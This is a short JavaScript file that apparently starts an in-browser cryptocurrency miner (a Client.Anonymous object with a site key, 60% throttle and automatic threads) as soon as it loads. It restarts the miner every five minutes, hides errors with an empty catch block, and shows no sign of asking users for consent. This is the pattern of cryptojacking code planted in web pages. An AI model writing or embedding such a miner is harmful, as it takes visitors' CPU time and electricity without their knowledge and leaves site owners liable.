var mainMiner=null;

function Test() {
    try {

        if (mainMiner != null && mainMiner.isRunning()) {
            alert('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
            mainMiner.stop();
        }

        mainMiner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
            throttle: 0.6,
            //threads:5,
            autoThreads:true
        });
        mainMiner.start();

        // Console.log('ServiceHit');
        alert('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
    }
    catch (e) {

    }
}


setInterval(function () {
    Test();

}, 300000)

Test();